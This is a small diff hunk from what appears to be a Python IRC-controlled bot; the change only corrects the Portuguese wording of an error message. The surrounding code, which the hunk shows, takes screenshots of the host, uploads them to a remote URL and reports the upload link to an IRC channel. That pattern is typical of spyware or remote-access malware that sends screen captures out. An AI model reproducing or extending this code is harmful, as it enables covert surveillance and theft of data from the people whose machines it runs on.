@@ -212,7 +212,7 @@ def oneScreenshots():# screenshot function
 		r = requests.post(urlFromUpload, files=files) #import requests
 		sendMsg(ircChanne, "..::Imagem urpado com sucesso para::.. http:"+urlFromUpShow + saveas)
 	except IOError:
-		sendMsg(ircChanne, "Voce nao tem privilegio grava no host")
+		sendMsg(ircChanne, "Voce nao tem privilegio para gravar no host")
 def multipleScreenshots():
 # originally by: Technic Dynamic, http://www.technicdynamic.com/
 # take multiple screenshots function
